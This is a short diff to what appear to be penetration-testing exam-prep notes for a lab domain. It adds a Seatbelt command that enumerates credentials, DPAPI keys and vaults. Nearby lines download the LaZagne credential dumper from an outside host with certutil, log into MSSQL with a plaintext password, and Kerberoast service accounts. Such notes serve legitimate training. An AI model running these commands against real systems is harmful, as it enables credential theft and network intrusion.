@@ -26,7 +26,7 @@ certutil -urlcache -split -f http://192.168.49.123:80/LaZagne.exe LaZagne.exe
 impacket-mssqlclient SRV22.OSCP.EXAM\svc_mssql:qazwsx@172.16.123.202 -windows-auth
 ```
 
-
+.\seatbelt.exe CredEnum DpapiMasterKeys RDCManFiles RDPSavedConnections WindowsCredentialFiles WindowsVault TokenGroups LogonSessions AutoRuns ScheduledTasks Services LocalGroups TokenPrivileges InterestingFiles -outputfile=seatbelt.txt
 
 ```
 impacket-GetUserSPNs -request -dc-ip 172.16.123.200 SRV22.OSCP.EXAM/svc_mssql
